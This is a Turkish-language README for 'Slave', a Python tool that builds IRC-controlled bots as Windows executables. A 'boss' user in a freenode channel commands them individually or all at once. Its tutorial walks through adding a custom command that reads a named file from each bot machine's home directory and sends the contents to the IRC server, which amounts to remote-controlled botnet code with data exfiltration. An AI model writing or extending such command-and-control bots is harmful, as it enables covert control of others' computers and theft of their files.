# SLAVE

Slave, Python ile yazılmış özelleştirilebilir bot oluşturan bir yazılımdır. [IRC](https://tr.wikipedia.org/wiki/Internet_Relay_Chat) protokolü üzerinden, yazılan botlar ile haberleşir.

## Nasıl kullanılır
```bash
$ git clone https://github.com/bufgix/slave
$ cd slave
```

Slave, gerek executable dosya oluşturmada gerekse bağımlıklıları kurmada `pipenv` i kullanır. `pipenv` hakkında daha fazla bilgiye [buradan](https://realpython.com/pipenv-guide/) buradan ulaşabilirsiniz.

`pipenv` i kurup, bağımlılıkları yükleyip, virtual env'e geçtikten sonra `bot.py` dosyasını açın. İçeriği aşağıdaki gibidir.
```python
# bot.py
from slave.lib.bots import BotBasic

config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}
BotBasic.read_config_from_dict(config)

## Write custom commands here


BotBasic.start()
```
Buradan sonra eğer botunuza özel komutlar eklemiyecekseniz executable dosyasını oluşturabilirsiniz. 

```bash
(venv) $ python -m slave bot.py
[i] Source: C:\Users\user\path\slave\bot.py
[i] Creating executable file...
[*] Created executable file. Check C:\Users\user\path\slave\dist
```

Oluşan `dist/` dizinini altında `bot.exe` dosyası artık kullanıma hazır.

`bot.exe` yi çalıştırdıktan sonra 5-10 saniye içinde `config` de belirlediğiniz şekilde IRC'ye bağlanır.

## Nasıl komut vereceksiniz
Slave botlarına emir vermek için `$` ön eki getirilir.
```
$info bfr24s
```   
```
$visit bfr24s https://google.com
```

gibi. Komuttan sonraki ilk parametre genelde vereceğiniz botun idsini alır. Eğer bütün botlara bu komutu vermek istiyorsanız `bot_id` yerine `/all` yazabilirsiniz. 

```
$visit /all https://google.com
```

Standart komutlar ve kullanımları aşağıdaki gibidir
```
quit: Kill bot -- Usage: $quit [/all | <bot_id>]
info: Information of bot machine -- Usage: $info [/all | <bot_id>]
message: Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>
visit: Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>
help: Help text of command -- Usage: $help <bot_id> <cmd>
```

Buradan sonra `config` de belirlediğiniz `bos_name` ile aynı olarak IRC server ve channel'e girin. Ardından botlarınıza emir vermeye başlayabilirsiniz.


## Nasıl kendi komutlarımı yazarım ?
Slave, kendi özel botunuzu yazmanızı sağlar. Bunu yapmak için `BotBasic` sınıfının `@register` decelerator'unu kullanmanız gerekir.

Şimdi kendimiz bir komut yazalım. Yazacağımız komut argüman olarak verdiğimiz dosya ismini okuyup içindekileri servera göndersin. Komutun söz dizimi şöyle olsun.
```
$read [/all | <bot_id>] <file_name>
```

`app.py` dosyasını açalım. Komutları `.start()` komutundan önce yazmanız yeterli.
```python
from slave.lib.bots import BotBasic

config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}
BotBasic.read_config_from_dict(config)

## Write custom commands here
@BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
def read_file(bot, args):
    pass

BotBasic.start()
```

Görüldügü gibi `register()` ilk paramtere olarak komut dizisini alır. `all=` keywordu, `<bot_id>` yerine `/all` kullanmamızı ve bütün botlarda aynı anda komutumuzun çalıştırılmasını sağlar. `on_connect=` Bu, eğer True ise yazdığınız komut servera bağlandığı anda çalışır. `help_text=` ise komutumuzun imzasıdır. Burada komutun nasıl kullanılacağı hakkında bilgi verebilirsiniz.

Komut fonksyonu iki parametre almak zorundadır. Birinci parametre olarak `Bot` objesi alır. Bu server ile bot arasında iletişimi sağlar.

```bot.send_text(text: str) -> None```

Servera text mesajı göndermeyi sağlar.

`bot.exit_server() -> None`

Botun serverdan ayrılmasını sağlar

`bot.send_command_help() -> None`

Var olan komutları ve bilgilerini servera gönderir.

İkinci argüman olan args ise argüman listesini alır.

![img](https://i.resimyukle.xyz/Vfy4BS.png)

şimdi komutumuzu yazmaya devam edelim
```python
from pathlib import Path

@BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
def read_file(bot, args):
    path = str(Path(f"~/{args[1]}").expanduser())
    with open(path, 'r') as f:
        bot.send_text(f.read())
```

şimdi test etmek için `bot.py` yi çalıştırabiliriz.
```python
(venv) $ python bot.py
```
`file.txt`
```
Hey. Im a bot
```

![img](https://i.resimyukle.xyz/e2M0Ge.png)

Tabi dosyayı okumdadan önce var olup olmadığını kontrol etmek önemlidir. Eğer var olmayan bir dosyaya erişmeye çalışırsanız bot, serverla haberleşmeyi kesecektir.



